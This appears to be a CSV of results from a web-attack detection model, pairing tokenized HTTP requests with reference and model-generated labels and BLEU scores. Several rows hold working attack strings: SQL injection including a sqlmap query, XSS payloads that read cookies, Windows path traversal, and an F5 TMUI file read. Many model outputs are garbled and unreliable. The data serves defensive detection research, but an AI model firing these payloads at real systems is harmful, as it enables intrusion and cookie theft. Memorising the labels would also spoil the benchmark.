payload,reference_text,candidate_text,bleu_score
"GET / cop / bbs / view / B0000153 / 1210329. do? statisMenuNo = 200911 ` WHERE 4975 = 4975 AND 6544 = 8174 - - YCzq HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows ; U ; Windows NT 5. 1 ; it ; rv : 1. 8. 0. 9 ) Gecko / 20061206 Firefox / 1. 5. 0. 9 \ r \ nReferer : http : / / kocca. kr : 80 / cop / bbs / view / B0000153 / 1210329. do \ r \ nHost : kocca. kr \ r \ nCookie : KCSESSIONID = fksWgkzTVMGGnXZVv8xRd3GBGjkpTsbkB1mSGcp6phNVkc2fsQ4k! 385399486! - 368784361 \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close",Label : 1 Attack Syntax :... WHERE 4975 = 4975 AND 6544 = 8174 - - Attack Type : SQL Injection,Label : 1 Attack Syntax : 200911 . . WHERE . = = = - - - - Attack Attack Type : Injection,0.2694353370737825
"ptor obj instanceof CrUser : false INFO, 2021. 08. 01 02 : 00 : 10, AnnounceManager. loadHeaderAnnounce : 79, - > MANAGE > AnnounceManager. loadHeaderAnnounce ( ) executed. load completed INFO, 2021. 08. 01 02 : 00 : 30, LoginCheckInterceptor. preHandle : 29, LoginCheckInterceptor obj instanceof CrUser : false INFO, 2021. 08. 01 02 : 10 : 31, LoginCheckInterceptor. preHandle : 29, LoginCheckInterceptor obj instanceof CrUser : false INFO, 2021. 08. 01 02 : 20 : 22, LoginCheckInterceptor. preHandle : 29, LoginCheckInterceptor obj instanceof CrUser : false INFO, 2021. 08. 01 02 : 30 : 23, LoginCheckInterceptor. preHandle : 29, LoginCheckInterceptor obj instanceof CrUser : false WARN, 2021. 08. 01 02 : 37 : 40, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / invoker / readonly ] in DispatcherServlet with name'servlet'WARN, 2021. 08. 01 02 : 37 : 42, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / _ ignition / execute - solution ] in DispatcherServlet with name'servlet'WARN, 2021. 08. 01 02 : 37 : 42, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / vendor / phpunit / phpunit / src / Util / PHP / eval - stdin. php ] in DispatcherServlet with name'servlet'WARN, 2021. 08. 01 02 : 37 : 59, PageNotFound. noHandlerFound : 1108, No mapping found for HTTP request with URI [ / robots. txt ] in DispatcherServlet with name'servlet'INFO, 2021. 08. 01 02 : 38 : 03, LoginCheckI",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"ps : / / www. ncsc. go. kr : 4018 / "" target = "" _ blank "" style = "" text - align : center ; "" title = "" "" > < br > < / a > <! - - 211124 - - > < button class = "" floating - menu bg - primary "" type = "" button "" id = "" main _ floating _ menu "" title = "" "" > < / button > < / div > < button class = "" top - btn bg - primary txt - button - 500 "" type = "" button "" id = "" main _ top _ btn "" alt = "" "" > < span > TOP < / span > < / button > < div class = "" mfp - hide white - popup - block "" id = "" popup - layer "" role = "" dialog "" aria - modal = "" true "" aria - labelledby = "" popup _ title "" > < div class = "" popup - wrapper "" >. < p class = "" invisible "" id = "" popup _ title "" > < / p > < div class = "" popup - content "" id = "" popup _ content "" >.................. < a class = "" card - wrapper "" data - popup - title = "" 2023 "" href = "" https : / / www. nis. go. kr : 4016 / CM / 1 _ 3 / view. do? seq = 352 & amp ; currentPage = 1 & amp ; selectBox = & amp ; searchKeyword = & amp ; fromDate = & amp ; toDate = # selectListForm "" >.......... < div class = "" card "" >.. < div class = "" card - top "" >.. < div class = "" background - overlay bg - light - black "" > < / div >.. < div class = "" card - header "" >.. < div class = "" logo "" >.. < img src = "" / resources / img / renewal _",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ stat _ ps _ so & CQL _ FILTER = obs _ year > = 2017 AND obs _ year < = 2020 AND obs _ type ='S'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 14235920. 402827, 4152469. 1387477, 14245704. 342447, 4157447. 1002141 & WIDTH = 2048 & HEIGHT = 1042 HTTP / 1. 1 Host : www. khoa. go. kr Connection : keep - alive User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 102. 0. 5005. 124 Safari / 537. 36 Edg / 102. 0. 1245. 41 Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYS Accept - Encoding : gzip, deflate Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8 Cookie : JSESSIONID = cDWkHYLFEiwrOqhph2KIoBebMzXfz38KCLknR1kxsR1efs8s7G54GWv7uRBehLIF. UEtIT0Evb2NlYW5ncmlkMTE = ; PCID = dea72648 - f265 - ce3a - 4b95 - 42ae566c69b8 - 1621822329739 ; SCOUTER = z4rgp41vg71rsj ; WMONID = NzfXI - vmsLV ; khoaNoticePop141 = true ; openApiKeyExpirePopup999999 = true",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
GET / board /? gdviewer = 1 & goods _ seq = 51 & id = goods _ review & iframe = < / script > < img + src = x + onerror = prompt ( ) > < script > HTTP / 1. 1 Host : www. mall. shop User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ; rv : 92. 0 ) Gecko / 20100101 Firefox / 92. 0 Pragma : no - cache Cache - Control : no - cache Referer : http : / / www. mall. shop / goods / view? no = 51 Cookie : shopReferer = ; today _ view = a : 15 : { i : 0 ; i : 55 ; i : 1 ; i : 39 ; i : 2 ; i : 53 ; i : 3 ; i : 41 ; i : 4 ; i : 40 ; i : 5 ; i : 48 ; i : 6 ; i : 79 ; i : 7 ; i : 42 ; i : 8 ; i : 70 ; i : 9 ; i : 69 ; i : 10 ; i : 77 ; i : 11 ; i : 75 ; i : 12 ; i : 67 ; i : 13 ; i : 54 ; i : 14 ; i : 51 ; } ; marketplace = direct Content - Length : 0,Label : 1 Attack Syntax : < / script > < img + src = x + onerror = prompt ( ) > < script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < img > img img x prompt prompt ( ( ( ( ) < < - Site ( > ) :,0.2264255360946916
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1, ( SELECT / * * / 55 - port - / * * / FROM / * * / ( SELECT / * * / ROW ( 55 - port -, 9430 ) > ( SELECT / * * / COUNT ( * ), CONCAT % 2 - port - x716a6b7a71, ( SELECT / * * / ( ELT ( 55 - port - = 55 - port -, 1 ) ) ), 0x716a626271, FLOOR ( RAND % 2 - port - ) * 2 ) ) x / * * / FROM / * * / ( SELECT / * * / 3753 / * * / UNION / * * / SELECT / * * / 5584 / * * / UNION / * * / SELECT / * * / 8813 / * * / UNION / * * / SELECT / * * / 8646 ) a / * * / GROUP / * * / BY / * * / x ) ) s ) sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor,","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = 1, ( SELECT / * * / 55 - port - / * * / FROM / * * / ( SELECT / * * / ROW ( 55 - port -, 9430 ) > ( SELECT / * * / COUNT ( * ), CONCAT % 2 - port - x716a6b7a71, ( SELECT / * * / ( ELT ( 55 - port - = 55 - port -, 1 ) ) ), 0x716a626271, FLOOR ( RAND % 2 - port - ) * 2 ) ) x / * * / FROM / * * / ( SELECT / * * / 3753 / * * / UNION / * * / SELECT / * * / 5584 / * * / UNION / * * / SELECT / * * / 8813 / * * / UNION / * * / SELECT / * * / 8646 ) a / * * / GROUP / * * / BY / * * / x ) ) s ) sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) security = impossible ; PHPSESSID = spl3sgi4295st4ou1lsu39ufor, Attack Type : SQL Injection","Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = 1 , ( SELECT / * * * / ( * * / * * / FROM / * * / ( SELECT / * * / ( ELT ( - - - , - ) , ( SELECT / * * / COUNT ( * ) , CONCAT % 2 - port - x716a6b7a71 , ( SELECT / * * / ( ( ( - - port - - - - - - , 1 ) ) ) , 0x716a626271 , FLOOR ( RAND % 2 ) port * * * 2 ) ) x / * * / FROM / * * / ( SELECT / * * / SELECT / * * / UNION / * * / SELECT / * * / 5469 / * * / UNION / * * / SELECT / * * / 5469 / * * / UNION / * * / SELECT / * * / SCHEMA ) a / * * / GROUP / * * / BY / * / / ) ) ) - ) sqlmap Type : SQL 5",0.6156586901187334
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = c8d6b70bf387e20160e395217306e20a _ 00385 & sid = d21c1f015d0a00fba13895217306e20a _ 00385 & guuid = c8d6b70bf387e20160e395217306e20a _ 00385 & expired = 1617402456 & dr = http : / / www. kocis. go. kr / eng / openCulturalNews. do & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openCulturalNews. do? langCode = lang002 & regCode = & cateCode = & searchText = & searchType = & startDate = & endDate = & page = 2 & js = Y & sr = 360x640 & scd = 32 & je = N & tz = - 4 & tye = 2021 & tmo = 4 & tda = 2 & tho = 17 & tmi = 57 & tse = 37 & lng = es - 419 & os = Linux armv7l & cpu = & vr = 5. 0 ( Linux ; Android 6. 0. 1 ; SM - G532M Build / MMB29T ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 55. 0. 2883. 91 Mobile Safari / 537. 36 & ck = Y & brsz = 360x560 & isnw = N HTTP / 1. 1 \ r \ nConnection : keep - alive \ r \ nHost : logger. kcisa. kr \ r \ nAccept : image / webp, image / *, * / * ; q = 0. 8 \ r \ nAccept - Language : es - US, en - US ; q = 0. 8, en ; q = 0. 6, ko - KR ; q = 0. 4, ko ; q = 0. 2, es - 419 ; q = 0. 2, es ; q = 0. 2 \ r \ nAccept - Encoding : gzip, deflate \ r \ nUser - Agent : Mozilla / 5. 0 ( Linux ; Android 6. 0. 1 ; SM - G532M Build / MMB29T ) AppleWebKit / 537. 36 ( KHTML, like Gecko )",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"terprise "" : { }, "" cloudSku "" : false, "" architecture "" : 9 }, "" caller "" : { "" locale "" : "" ko - KR "", "" name "" : "" "", "" version "" : "" 114. 0. 1823. 51 ( Official build ) "" }, "" client "" : { "" version "" : 281483717705734, "" data "" : { "" topTraffic "" : "" 638004170464094982 "", "" customSynchronousLookupUris "" : "" 0 "", "" synchronousLookupUris "" : "" 638230940218420745 "", "" customSettings "" : "" F95BA787499AB4FA9EFFF472CE383A14 "", "" edgeSettings "" : "" 2. 0 - 48b11410dc937a1723bf4c5ad33ecdb286d8ec69544241bc373f753e64b396c1 "" } } }, "" config "" : { "" user "" : { "" uriReputation "" : { "" enforcedByPolicy "" : false, "" level "" : "" warn "" } }, "" device "" : { "" appControl "" : { "" level "" : "" anywhere "" }, "" appReputation "" : { "" enforcedByPolicy "" : false, "" level "" : "" warn "" } } }, "" destination "" : { "" uri "" : "" http : / / www. gajok75. org / zbxe /? mid = mainnotice2 "", "" ip "" : "" 115. 68. 95. 104 "" }, "" referrer "" : { "" uri "" : "" http : / / www. gajok75. org / main. php "", "" ip "" : "" 115. 68. 95. 104 "" }, "" type "" : "" frame "", "" forceServiceDetermination "" : false, "" correlationId "" : "" d41baac7 - 08d6 - 4650 - bd5b - b5d21cedf5ed "", "" synchronous "" : false }",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
GET / index. php? v = d HTTP / 1. 1 Host : gw. mmk. or. kr : 8 5 0 0 User - Agent : Mozilla / 5. 0 ( Windows NT 5. 1 ) AppleWebKit / 5 3 7. 3 6 ( KHTML COMMA like Gecko ) Chrome / 3 4. 0. 1 8 6 6. 2 3 7 Safari / 5 3 7. 3 6 Connection : close Accept : * / * Accept - Language : en Accept - Encoding : gzip,Label : 0 Attack Syntax : nan Attack Type : nan,Label : 1 Attack Syntax : nan Attack Type : nan,0.7419446627365011
"9 5! E / @ ~ $ H om ^ 5 P 3 0 0 2 2 1 3 TT 1 2 4 3 2 ` H T T 1 0 0 dummy textptr dummyTS. 1 COMMA. ( 1 8 5 5 - 3 0 0 4 ). 4. 1 "" 0 0 7 0 0 2 2 1 4 TTS 1 2 4 3 1 ` H T { 3 0 0 2 2 1 4 TTS 1 2 4 3 2 ` H T T 1 0 0 dummy textptr dummyTS. 1 COMMA. ( 1 8 5 5 - 3 0 0 4 ). 4. 1 "" 0 0 7 0 0 2 2 1 5 BMW 1 1 2 4 3 1 ` H T { 3 0 0 2 2 1 5 BMW 1 1 2 4 3 2 ` H T T 1 0 0 dummy textptr dummyTS. 1 COMMA. ( 1 8 5 5 - 3 0 0 4 ). 4. 1 "" 0 0 7 0 0 2 2 1 6 BMW 2 1 2 4 3 1 ` H T { 3 0 0 2 2 1 6 BMW 2 1 2 4 3 2 ` H T T 1 0 0 dummy textptr dummyT",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - / dvwa / vulnerabilities / upload / / dvwa / phpinfo. php /?'A < script > alert ( 56 ) < / script > Mozilla / 5. 0 ( Windows NT 6. 1 ; WOW64 ; Trident / 7. 0 ; rv : 11. 0 ) like Gecko security = impossible ; PHPSESSID = ajgndkjslp2ufnmdpbtt84b47r,",Label : 1 Attack Syntax : < script > alert ( 56 ) < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < script > alert ( 22 ) < / script > Attack Type : : Cross Site Scripting ( XSS ),0.770565432650177
GET / board / board _ view? code = < script > prompt ( document. cookie ) < / script > HTTP / 1. 1 Host : www. college. school Accept - Encoding : identity Cookie : ID = 1094200543 ; designart _ site = 3pgcbrq1016amurt18nd0penhdj79s6i User - Agent : python - urllib3 / 1. 26. 9,Label : 1 Attack Syntax : < script > prompt ( document. cookie ) < / script > Attack Type : Cross - Site Scripting ( XSS ),Label : 1 Attack Syntax : < script > prompt ( document . cookie ) < / script > Attack Type : Cross - Site Scripting ( XSS ),0.8696398662122882
"GET / learn / AjaxLearnList. do? emBigCd = 08 & emSmlCd = & pageIndex =.. \.. \.. \.. \.. \.. \.. \.. \ windows \ win. ini & searchCcdId = & searchSmlCd = & searchStat = & searchSttCd = & searchText = HTTP / 1. 1 \ nReferer : http : / / www. mmca. go. kr / \ nCookie : JSESSIONID = 6oaryRcz9daWK6xfosxLF1r8xsSm03aTX0Ku4WVFlIU91uWFJbZGd0OoXbAUSmTo. mocaweb _ servlet _ engine7 ; CID = null \ nAccept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 \ nAccept - Encoding : gzip, deflate \ nHost : www. mmca. go. kr \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 73. 0. 3683. 103 Safari / 537. 36 \ nConnection : Keep - alive",Label : 1 Attack Syntax : pageIndex =.. \.. \.. \.. \.. \.. \.. \.. \ windows \ win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . \ . . . . . . . \ . . . \ . \ \ . . \ . . \ \ \ \ \ \ \ Attack Attack Type : :,0.14764627112605114
GET / tmui / login. jsp /.. ; / tmui / locallb / workspace / fileRead. jsp? fileName = / etc / f 5 - release HTTP / 1. 1 Host : gw. mmk. or. kr : 8 5 0 0 User - Agent : Mozilla / 5. 0 ( Windows NT 5. 1 ) AppleWebKit / 5 3 7. 3 6 ( KHTML COMMA like Gecko ) Chrome / 3 5. 0. 3 3 1 9. 1 0 2 Safari / 5 3 7. 3 6 Connection : close Accept : * / * Accept - Language : en Accept - Encoding : gzip,Label : 1 Attack Syntax : / tmui / login. jsp /. /. / ; / tmui / locallb / workspace / fileRead. jsp? fileName = etc / f 5 - release Attack Type : Path Traversal,Label : 1 Attack Syntax : GET / / / / / / / tmui / tmui / / / / / . / . . . . Type Type : : Attack,0.21519295756464527
"GET / oceangrid / cmm / proxyRun. do? call = wms & LAYERS = geotwo _ postgis : og _ rcm _ gm _ mdc _ view & CQL _ FILTER = cre _ year > = 2020 AND cre _ year < = 2020 AND date _ type ='hours'& SERVICE = WMS & REQUEST = GetMap & FORMAT = image / png & VERSION = 1. 3. 0 & EXCEPTIONS = text / xml & TRANSPARENT = TRUE & STYLES = & CRS = EPSG : 900913 & BBOX = 13110492. 192468, 3787354. 0601194, 15244614. 021894, 4829343. 6295578 & WIDTH = 1745 & HEIGHT = 852 HTTP / 1. 1 Host : www. khoa. go. kr Connection : keep - alive User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 102. 0. 0. 0 Safari / 537. 36 Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Referer : http : / / www. khoa. go. kr / oceangrid / gis / category / observe / observeSearch. do? type = EYS Accept - Encoding : gzip, deflate Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : JSESSIONID = 7x0O6Enz9fYoNsf4jRJF3ShE33CpnuQ4TLQ56lZFHTm4aOTa7kt2EaWn3HpyyJp6. UEtIT0Evb2NlYW5ncmlkMTE = ; PCID = 11b84d89 - d171 - 3657 - 9d98 - 82289770bfec - 1614839343009 ; _ ga = GA1. 3. 655525438. 1641253731 ; WMONID = jD499eMcEaQ ; SCOUTER = x6vhoocl848s1u ; JSESSIONID = zjBQYMvcNoHsAoCvjog22e0rqu7aFbduT",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / portal / bbs / view / B0000204 / 1926522. do? searchCnd ='AND 6141 = 1508 OR'GZjy'='eCvp & searchWrd = & cateTp1 = & cateTp2 = & useAt = & menuNo = 200375 & categorys = 4 & subcate = 65 & cateCode = 0 & type = & instNo = 0 & questionTp = & uf _ Setting = & recovery = & option1 = & option2 = & year = & categoryCOM062 = & categoryCOM063 = & categoryCOM208 = & categoryInst = & morePage = & delCode = & qtp = & pageIndex = 7 HTTP / 1. 1 \ r \ nCache - Control : no - cache \ r \ nUser - Agent : Mozilla / 5. 0 ( X11 ; U ; Linux i686 ; fr ; rv : 1. 8. 1. 3 ) Gecko / 20070310 Firefox / 2. 0. 0. 3 ( Debian - 2. 0. 0. 3 - 2 ) \ r \ nReferer : http : / / portal. kocca. kr : 80 / portal / bbs / view / B0000204 / 1926522. do \ r \ nHost : portal. kocca. kr \ r \ nCookie : KCSESSIONID = tJhHgkrpLT9xx2LLHFb9DyT1vWJGtWzRzvfTQ04xLMPJC1dcYNJh! 385399486! - 368784361 \ r \ nAccept : * / * \ r \ nAccept - Encoding : gzip, deflate \ r \ nConnection : close",Label : 1 Attack Syntax :'AND 6141 = 1508 OR'GZjy'='eCvp Attack Type : SQL Injection,Label : 1 Attack Syntax : AND = = = AND AND ' ' ' = ' Attack Attack Type : SQL Injection,0.31573558123189943
"GET / favicon / v2 / https : / / ru. wikipedia. org / wiki / ; https : / / regnum. ru / news / 3815719 ; https : / / postnauka. ru / talks / 156731 ; https : / / t. me / s / korea _ meow ; https : / / dzen. ru / a / zjlv5g5zdn0i5p6p ; https : / / www. ifes - ras. ru / person / 193 ; https : / / www. youtube. com / playlist? list = plgxljxumhb9puuv6iwwtefos2wuybknnm ; https : / / istina. msu. ru / profile / makkawity /? size = 32 & stub = 1 HTTP / 1. 1 Host : favicon. yandex. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 58 sec - ch - ua - platform : "" Windows "" Accept : image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / yandex. ru / Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8, ru ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / js / cmmn / select2. min. js HTTP / 1. 1 Host : www. koreahana. or. kr Connection : keep - alive Pragma : no - cache Cache - Control : no - cache accept - language : zh - CN, zh ; q = 0. 9 User - Agent : Mozilla / 5. 0 ( iPhone ; CPU iPhone OS 11 _ 0 like Mac OS X ) AppleWebKit / 604. 1. 34 ( KHTML, like Gecko ) Version / 11. 0 Mobile / 15A5341f Safari / 604. 1 Accept : * / * Sec - Fetch - Site : same - origin Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : script Cookie : JSESSIONID = D2AE73FB57DE8223D47A47F5073399C5",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / jeongeup / thema / Basic / colorset / Basic / colorset. css HTTP / 1. 1 Host : xn - - zb0bp61arxc6zit2ak3efz9a. com Connection : keep - alive User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 111. 0. 0. 0 Safari / 537. 36 Edg / 111. 0. 1661. 54 Accept : text / css, * / * ; q = 0. 1 Referer : http : / / xn - - zb0bp61arxc6zit2ak3efz9a. com / jeongeup / Accept - Encoding : gzip, deflate Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8 Cookie : PHPSESSID = otga3tg26cj0motvgr11dtma34 ; 2a0d2363701f23f8a75028924a3af643 = MTQuMzkuMjE2LjI1Mw = =",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / board / board _ write? code = < LINK + REL = "" stylesheet "" + HREF = "" javascript : javascript : alert ( 1 ) ; "" > HTTP / 1. 1 Host : 10. 0. 20. 20 User - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 ; rv : 60. 0 ) Gecko / 20100101 Firefox / 60. 0 Accept - Encoding : gzip, deflate Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Connection : close Accept - Language : en - US, en ; q = 0. 5 DNT : 1 Upgrade - Insecure - Requests : 1","Label : 1 Attack Syntax : < LINK + REL = "" stylesheet "" + HREF = "" javascript : javascript : alert ( 1 ) ; "" > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : a + = = "" "" "" = "" javascript "" javascript : javascript alert alert ( 1 ) > > > Type Type : Cross - ( Scripting ) XSS )",0.3585749488193107
"GET / image / origin / 016 / 2023 / 06 / 09 / 2153947. jpg? type = nf336 _ 206 HTTP / 1. 1 Host : imgnews. pstatic. net Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / n. news. naver. com / mnews / article / 421 / 0006855401? sid = 104 Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
